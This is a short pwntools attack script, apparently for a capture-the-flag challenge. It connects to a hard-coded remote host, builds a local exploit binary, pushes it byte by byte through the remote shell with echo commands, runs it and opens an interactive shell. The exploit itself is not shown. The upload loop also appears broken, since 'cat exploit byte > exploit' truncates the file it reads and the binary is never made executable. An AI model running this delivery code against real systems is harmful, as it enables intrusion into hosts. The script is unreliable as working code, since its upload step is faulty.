#!/usr/bin/env python2

from pwn import *
import os

r = remote('64.227.36.254', 7018)


def hexify(byte):
    return '\\x' + hex(ord(byte))[2:].zfill(2)


def send_cmd(r, cmd):
    r.recvuntil('$ ')
    r.send(cmd + '\n')


os.system('make _exploit')
os.system('strip _exploit')
elf = open('_exploit', 'rb').read()

send_cmd(r, 'echo -n > exploit')

with log.progress("Uploading (total: {} bytes)".format(hex(len(elf)))) as l:
    for i, byte in enumerate(elf):
        l.status("{}%".format(i * 100 // len(elf)))
        send_cmd(r, 'echo -n ' + hexify(byte) + ' > byte')
        send_cmd(r, 'cat exploit byte > exploit')

send_cmd(r, 'exploit')
r.recvline()
r.interactive()
